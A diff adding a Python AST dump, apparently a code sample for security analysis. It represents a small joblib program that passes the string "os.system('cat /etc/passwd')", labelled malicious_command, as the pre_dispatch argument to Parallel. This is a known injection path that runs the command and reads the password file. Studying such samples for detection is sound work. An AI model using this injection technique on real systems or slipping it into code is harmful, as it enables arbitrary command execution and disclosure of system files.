@@ -1,0 +1,78 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='os')]),
+        ImportFrom(
+            module='joblib',
+            names=[
+                alias(name='Parallel'),
+                alias(name='delayed')],
+            level=0),
+        FunctionDef(
+            name='f',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='x')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Return(
+                    value=BinOp(
+                        left=Name(id='x', ctx=Load()),
+                        op=Mult(),
+                        right=Name(id='x', ctx=Load())))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='malicious_command', ctx=Store())],
+            value=Constant(value="os.system('cat /etc/passwd')")),
+        Assign(
+            targets=[
+                Name(id='p', ctx=Store())],
+            value=Call(
+                func=Name(id='Parallel', ctx=Load()),
+                args=[],
+                keywords=[
+                    keyword(
+                        arg='n_jobs',
+                        value=Constant(value=2)),
+                    keyword(
+                        arg='pre_dispatch',
+                        value=Name(id='malicious_command', ctx=Load()))])),
+        Assign(
+            targets=[
+                Name(id='results', ctx=Store())],
+            value=Call(
+                func=Name(id='p', ctx=Load()),
+                args=[
+                    GeneratorExp(
+                        elt=Call(
+                            func=Call(
+                                func=Name(id='delayed', ctx=Load()),
+                                args=[
+                                    Name(id='f', ctx=Load())],
+                                keywords=[]),
+                            args=[
+                                Name(id='i', ctx=Load())],
+                            keywords=[]),
+                        generators=[
+                            comprehension(
+                                target=Name(id='i', ctx=Store()),
+                                iter=Call(
+                                    func=Name(id='range', ctx=Load()),
+                                    args=[
+                                        Constant(value=10)],
+                                    keywords=[]),
+                                ifs=[],
+                                is_async=0)])],
+                keywords=[])),
+        Expr(
+            value=Call(
+                func=Name(id='print', ctx=Load()),
+                args=[
+                    Name(id='results', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
